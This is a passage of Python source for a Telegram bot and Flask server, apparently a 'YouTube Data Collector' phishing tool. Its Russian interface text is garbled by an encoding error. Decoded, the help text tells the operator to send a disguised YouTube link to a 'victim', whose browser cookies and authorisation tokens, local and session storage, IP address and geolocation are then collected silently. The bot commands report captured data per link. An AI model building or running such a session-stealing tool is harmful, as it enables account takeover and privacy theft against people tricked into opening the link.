3. –û—Ç–ø—Ä–∞–≤—å—Ç–µ —ç—Ç—É —Å—Å—ã–ª–∫—É –∂–µ—Ä—Ç–≤–µ
4. –ö–æ–≥–¥–∞ –∂–µ—Ä—Ç–≤–∞ –æ—Ç–∫—Ä–æ–µ—Ç —Å—Å—ã–ª–∫—É, –Ω–∞—á–Ω–µ—Ç—Å—è —Å–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö
5. –í—Å–µ –¥–∞–Ω–Ω—ã–µ –ø—Ä–∏–¥—É—Ç –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏

üîê *–ß—Ç–æ —Å–æ–±–∏—Ä–∞–µ—Ç—Å—è:*
‚Ä¢ –í—Å–µ cookies –±—Ä–∞—É–∑–µ—Ä–∞ (–≤–∫–ª—é—á–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–æ–Ω–Ω—ã–µ —Ç–æ–∫–µ–Ω—ã)
‚Ä¢ LocalStorage –∏ SessionStorage
‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –±—Ä–∞—É–∑–µ—Ä–µ –∏ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
‚Ä¢ WebRTC –¥–∞–Ω–Ω—ã–µ
‚Ä¢ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–ª–∞–≥–∏–Ω–∞—Ö
‚Ä¢ IP –∞–¥—Ä–µ—Å –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è
‚Ä¢ –í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞ –∏ —è–∑—ã–∫

‚ö° *–û—Å–æ–±–µ–Ω–Ω–æ—Å—Ç–∏:*
‚Ä¢ –ù–∞—Å—Ç–æ—è—â–µ–µ YouTube –≤–∏–¥–µ–æ (–≤—Å—Ç—Ä–∞–∏–≤–∞–µ—Ç—Å—è —Å YouTube)
‚Ä¢ –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –≤ —Ñ–æ–Ω–æ–≤–æ–º —Ä–µ–∂–∏–º–µ
‚Ä¢ –ñ–µ—Ä—Ç–≤–µ –Ω–µ –Ω—É–∂–Ω–æ –Ω–∏—á–µ–≥–æ –¥–µ–ª–∞—Ç—å
‚Ä¢ –í—Å–µ –¥–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω—è—é—Ç—Å—è –≤ –±–∞–∑—É
‚Ä¢ –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ —Å–µ—Ä–≤–∏—Å–æ–≤ –ø–æ cookies

üîß *–û—Å–Ω–æ–≤–Ω—ã–µ –∫–æ–º–∞–Ω–¥—ã:*
‚Ä¢ /start - –ù–∞—á–∞–ª–æ —Ä–∞–±–æ—Ç—ã
‚Ä¢ /create_link - –°–æ–∑–¥–∞—Ç—å —Å—Å—ã–ª–∫—É
‚Ä¢ /my_links - –ú–æ–∏ —Å—Å—ã–ª–∫–∏
‚Ä¢ /stats - –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ —Å–∏—Å—Ç–µ–º—ã
‚Ä¢ /data [ID] - –ü—Ä–æ—Å–º–æ—Ç—Ä –¥–∞–Ω–Ω—ã—Ö
‚Ä¢ /help - –ü–æ–º–æ—â—å

üåê *–°–µ—Ä–≤–µ—Ä:* {}
""".format(SERVER_URL)
        await query.message.reply_text(help_message, parse_mode=ParseMode.MARKDOWN)
    
    elif data.startswith("copy_"):
        link_id = data[5:]
        link = db.get_link(link_id)
        
        if link:
            await query.message.reply_text(
                f"üìã *–°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É:*\n\n`{link['server_url']}`",
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("stats_"):
        link_id = data[6:]
        link = db.get_link(link_id)
        
        if link:
            stats = db.get_link_stats(link_id)
            data_list = db.get_data_by_link(link_id)
            
            message = f"""
üìä *–°–¢–ê–¢–ò–°–¢–ò–ö–ê –°–°–´–õ–ö–ò*

üé¨ *–í–∏–¥–µ–æ:* {link['title']}
üîó *ID:* `{link_id}`
üìÖ *–°–æ–∑–¥–∞–Ω–æ:* {link['created_at'][:10]}
üë£ *–ü–µ—Ä–µ—Ö–æ–¥–æ–≤:* {stats['clicks']}
üìä *–î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ:* {stats['captured']}

üìà *–ü–û–°–õ–ï–î–ù–ò–ï –î–ê–ù–ù–´–ï:*
"""
            
            for i, data_item in enumerate(data_list[:3], 1):
                message += f"\n{i}. *ID:* `{data_item['id']}`\n"
                message += f"   üïí {data_item['timestamp'][:16]}\n"
                message += f"   üåê {data_item['ip_address']}\n"
                message += f"   üç™ Cookies: {len(data_item.get('cookies', []))}\n"
                message += f"   üóÇ LocalStorage: {len(data_item.get('localStorage', {}))}\n"
            
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN
            )
    
    elif data.startswith("link_info_"):
        link_id = data[10:]
        link = db.get_link(link_id)
        
        if link:
            stats = db.get_link_stats(link_id)
            
            message = f"""
üîó *–ò–ù–§–û–†–ú–ê–¶–ò–Ø –û –°–°–´–õ–ö–ï*

üé¨ *–ù–∞–∑–≤–∞–Ω–∏–µ:* {link['title']}
üìù *–û–ø–∏—Å–∞–Ω–∏–µ:* {link['description'][:100]}...
üîó *–û—Ä–∏–≥–∏–Ω–∞–ª—å–Ω–∞—è —Å—Å—ã–ª–∫–∞:* {link['youtube_url'][:50]}...
üåê *–û—Ç—Å–ª–µ–∂–∏–≤–∞–µ–º–∞—è —Å—Å—ã–ª–∫–∞:* {link['server_url']}
üìÖ *–°–æ–∑–¥–∞–Ω–æ:* {link['created_at'][:19]}
üë£ *–ü–µ—Ä–µ—Ö–æ–¥–æ–≤:* {stats['clicks']}
üìä *–î–∞–Ω–Ω—ã—Ö —Å–æ–±—Ä–∞–Ω–æ:* {stats['captured']}

üí° *–ö–æ–º–∞–Ω–¥—ã:*
‚Ä¢ –°–∫–æ–ø–∏—Ä—É–π—Ç–µ —Å—Å—ã–ª–∫—É –≤—ã—à–µ –∏ –æ—Ç–ø—Ä–∞–≤—å—Ç–µ –∂–µ—Ä—Ç–≤–µ
‚Ä¢ –î–∞–Ω–Ω—ã–µ –±—É–¥—É—Ç –ø—Ä–∏—Ö–æ–¥–∏—Ç—å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏
"""
            
            keyboard = [
                [InlineKeyboardButton("üìã –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É", callback_data=f"copy_{link_id}")],
                [InlineKeyboardButton("üîó –û—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É", url=link['server_url'])]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.message.reply_text(
                message,
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=reply_markup,
                disable_web_page_preview=True
            )

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫"""
    logger.error(f"Update {update} caused error {context.error}", exc_info=True)

# ========== –ó–ê–ü–£–°–ö –°–ò–°–¢–ï–ú–´ ==========
def run_flask():
    """–ó–∞–ø—É—Å–∫ Flask —Å–µ—Ä–≤–µ—Ä–∞"""
    try:
        logger.info(f"Starting Flask server on port {FLASK_PORT}")
        app.run(
            host='0.0.0.0',
            port=FLASK_PORT,
            debug=False,
            use_reloader=False,
            threaded=True
        )
    except Exception as e:
        logger.error(f"Flask server error: {e}")

def run_bot():
    """–ó–∞–ø—É—Å–∫ Telegram –±–æ—Ç–∞"""
    global telegram_app
    
    try:
        telegram_app = Application.builder().token(BOT_TOKEN).build()
        
        # –†–µ–≥–∏—Å—Ç—Ä–∏—Ä—É–µ–º –æ–±—Ä–∞–±–æ—Ç—á–∏–∫–∏
        telegram_app.add_handler(CommandHandler("start", start_command))
        telegram_app.add_handler(CommandHandler("create_link", create_link_command))
        telegram_app.add_handler(CommandHandler("stats", stats_command))
        telegram_app.add_handler(CommandHandler("my_links", my_links_command))
        telegram_app.add_handler(CommandHandler("data", data_command))
        telegram_app.add_handler(CommandHandler("help", lambda u, c: button_handler(u, c)))
        
        # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ YouTube —Å—Å—ã–ª–æ–∫
        telegram_app.add_handler(MessageHandler(
            filters.TEXT & ~filters.COMMAND, handle_youtube_url
        ))
        
        # Inline –∫–Ω–æ–ø–∫–∏
        telegram_app.add_handler(CallbackQueryHandler(button_handler))
        
        # –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –æ—à–∏–±–æ–∫
        telegram_app.add_error_handler(error_handler)
        
        print("‚úÖ Telegram –±–æ—Ç –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω")
        print("ü§ñ –ó–∞–ø—É—Å–∫–∞—é polling...")
        
        # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞
        telegram_app.run_polling(allowed_updates=Update.ALL_UPDATES)
        
    except Exception as e:
        logger.error(f"Failed to start bot: {e}")
        print(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –±–æ—Ç–∞: {e}")

def main():
    """–û—Å–Ω–æ–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è –∑–∞–ø—É—Å–∫–∞"""
    print("=" * 70)
    print("ü§ñ YOUTUBE DATA COLLECTOR - –õ–û–ö–ê–õ–¨–ù–´–ô –°–ï–†–í–ï–†")
    print("=" * 70)
    print()
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ç–æ–∫–µ–Ω–∞
    if BOT_TOKEN == "–í–ê–®_–¢–û–ö–ï–ù_–ë–û–¢–ê_TELEGRAM":
        print("‚ùå –û–®–ò–ë–ö–ê: –ù–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω BOT_TOKEN!")
        print("–ü–æ–ª—É—á–∏—Ç–µ —É @BotFather –∏ –≤—Å—Ç–∞–≤—å—Ç–µ –≤ –∫–æ–¥")
        return
    
    print("‚úÖ –¢–æ–∫–µ–Ω –ø—Ä–æ–≤–µ—Ä–µ–Ω")
    print(f"üëë –ê–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä: {ADMIN_ID}")
    print(f"üåê –°–µ—Ä–≤–µ—Ä: {SERVER_URL}")
    print(f"üöÄ –ü–æ—Ä—Ç: {FLASK_PORT}")
    print()
    
    # –°–æ–∑–¥–∞–µ–º –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö
    print("üìÅ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –±–∞–∑—ã –¥–∞–Ω–Ω—ã—Ö...")
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º Flask –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    time.sleep(2)  # –î–∞–µ–º Flask –≤—Ä–µ–º—è –Ω–∞ –∑–∞–ø—É—Å–∫
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º –±–æ—Ç–∞ –≤ –æ—Å–Ω–æ–≤–Ω–æ–º –ø–æ—Ç–æ–∫–µ
    run_bot()

if __name__ == '__main__':
    main()
